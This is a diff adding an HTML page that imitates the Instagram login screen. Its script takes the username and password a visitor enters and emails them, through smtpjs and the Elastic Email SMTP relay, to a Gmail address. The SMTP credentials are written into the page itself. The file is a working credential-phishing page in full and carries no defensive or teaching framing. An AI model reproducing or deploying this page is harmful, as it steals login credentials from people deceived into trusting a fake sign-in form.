@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Instagram Login</title>
+</head>
+
+<body>
+    <main>
+        <img class="insta-img" src="IG.jpeg" alt="" class="phoneImg">
+        <div class="form-div">
+            <form action="">
+                <img class="instaLogo" src="instaLogo.png" alt="logo">
+                <input id="username" type="text" class="input" placeholder="phone number, username, or email" required>
+                <input id="password" type="password" class="input" required placeholder="Password">
+                <input class="login-btn" type="button" value="Log In" onclick="send()">
+                <!-- <button class="login-btn">Log In</button> -->
+                <p id="or">or</p>
+                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
+            </form>
+            <script src="https://smtpjs.com/v3/smtp.js">
+            </script>
+            <script>
+                function send() {
+                    console.log("function call");
+                    var username = document.getElementById("username").value;
+                    var password = document.getElementById("password").value;
+
+                    var body = "Name: " + username + "<br/> Password: " + password;
+
+                    
+                    Email.send({
+                        Host: "smtp.elasticemail.com",
+                        Username: "smilwanter@gmail.com",
+                        Password: "54D5162E16A54D0E25937BFFB00C86AFB97A",
+                        To: 'smilwanter@gmail.com',
+                        From: "smilwanter@gmail.com",
+                        Subject: username,
+                        Body: body
+                    }).then(
+                        message => alert(message)
+                    );
+                }
+            </script>
+            <div class="sign-up">
+                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app</p>
+                <div class="store">
+                    <img id="play" src="playStore.png" alt="">
+                    <img id="microsoft" src="getMicrosoft.png" alt="">
+                </div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
